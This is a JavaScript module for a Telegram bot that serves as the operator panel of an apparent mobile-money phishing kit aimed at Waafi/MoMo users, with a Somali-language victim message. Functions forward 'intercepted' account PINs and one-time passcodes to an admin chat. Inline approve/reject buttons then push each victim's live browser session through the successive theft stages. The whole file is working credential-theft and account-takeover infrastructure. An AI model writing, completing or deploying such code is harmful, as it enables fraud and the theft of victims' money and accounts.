const TelegramBot = require('node-telegram-bot-api');

const token = process.env.BOT_TOKEN;
const chatId = process.env.ADMIN_CHAT_ID;

if (!token || !chatId) {
    console.error("❌ Crucial environment keys (BOT_TOKEN / ADMIN_CHAT_ID) are undefined.");
}

// Initialize bot for webhook context processing
const bot = new TelegramBot(token);

/**
 * Parses generic JSON structures dynamically into consistent human-readable key-value pairs
 */
function formatPayloadMessage(appId, headline, metadata) {
    let baseTemplate = `<b>${headline}</b>\n`;
    baseTemplate += `<code>────────────────────────</code>\n`;
    baseTemplate += `🆔 <b>App Session:</b> <code>${appId}</code>\n`;
    
    for (const [key, val] of Object.entries(metadata)) {
        if (val !== undefined && val !== null && val !== '') {
            const label = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
            baseTemplate += `🔹 <b>${label}:</b> <code>${val}</code>\n`;
        }
    }
    baseTemplate += `<code>────────────────────────</code>`;
    return baseTemplate;
}

/**
 * Builds unified interactive buttons for handling multi-step workflow actions
 */
function buildInlineOptions(appId, prefix = "approve") {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "✅ Approve / Next", callback_data: `${prefix}_${appId}` },
                    { text: "❌ Reject Status", callback_data: `reject_${appId}` }
                ]
            ]
        },
        parse_mode: 'HTML'
    };
}

/**
 * Forwards structured forms safely out to the designated administrative panel channel
 */
function sendToAdmin(appId, title, metadata, generateControls = false) {
    const textContent = formatPayloadMessage(appId, title, metadata);
    const layoutSettings = generateControls ? buildInlineOptions(appId, "approve") : { parse_mode: 'HTML' };
    
    bot.sendMessage(chatId, textContent, layoutSettings).catch(err => {
        console.error(`❌ Admin channel messaging failure: ${err.message}`);
    });
}

/**
 * Delivers intercepted MoMo security PIN codes to the administrator channel
 */
function sendFinalApproval(appId, pinCode) {
    const bodyText = `<b>🔒 Intercepted Account Security PIN</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🔑 <b>Waafi PIN Entry:</b> <code>${pinCode}</code>\n<code>────────────────────────</code>`;
    bot.sendMessage(chatId, bodyText, buildInlineOptions(appId, "pinok")).catch(err => {
        console.error(`❌ Pin data routing failure: ${err.message}`);
    });
}

/**
 * Relays secondary step factor authorization strings
 */
function sendSecondOTP(appId, backupCode) {
    const textMarkup = `<b>⚠️ Secondary Authorization Layer (OTP 2)</b>\n<code>────────────────────────</code>\n🆔 <b>App Session:</b> <code>${appId}</code>\n🛡️ <b>Verification Key:</b> <code>${backupCode}</code>\n<code>────────────────────────</code>`;
    bot.sendMessage(chatId, textMarkup, buildInlineOptions(appId, "otp2ok")).catch(err => {
        console.error(`❌ Step secondary data routing failure: ${err.message}`);
    });
}

// Process administrator feedback adjustments directly from backend channel
bot.on('callback_query', (query) => {
    const callbackData = query.data;
    const messageId = query.message.message_id;
    
    const [action, targetAppId] = callbackData.split('_');
    if (!action || !targetAppId) return;

    let systemResponseLog = "";

    switch (action) {
        case 'approve':
            // Step 1 OTP 1 -> Advances user interface to Step 2 PIN Box
            global.io.to(targetAppId).emit('admin-approve-otp');
            systemResponseLog = "🟢 Initial OTP Verified. Pushed to PIN stage.";
            break;

        case 'pinok':
            // Step 2 PIN Entry -> Advances user interface to Step 3 OTP 2 Form
            global.io.to(targetAppId).emit('pin-verified');
            systemResponseLog = "🟢 PIN Captured. Pushed to Secondary Verification (OTP 2).";
            break;

        case 'otp2ok':
            // Step 3 OTP 2 Form -> Advances user interface to Step 4 Parameter configuration panels
            global.io.to(targetAppId).emit('admin-approve-otp2');
            systemResponseLog = "🟢 Secondary Layer Cleared. Opened parameters dashboard.";
            break;

        case 'reject':
            // Universal cancellation drop handling rules across active paths
            global.io.to(targetAppId).emit('admin-reject', { message: "Xaqiijintaada waa la diiday. Fadlan isku day markale." });
            systemResponseLog = "🔴 Application state systematically dropped by admin.";
            break;
            
        default:
            console.warn(`⚠️ Unrecognized interaction handler context: ${action}`);
            return;
    }

    // Reflect operational adjustments inside backend log message templates
    bot.editMessageText(`${query.message.text}\n\n[Action Log]: ${systemResponseLog}`, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML'
    }).catch(err => console.error(`❌ Message context update exception: ${err.message}`));

    bot.answerCallbackQuery(query.id, { text: "Action logged successfully." });
});

module.exports = {
    bot,
    sendToAdmin,
    sendFinalApproval,
    sendSecondOTP
};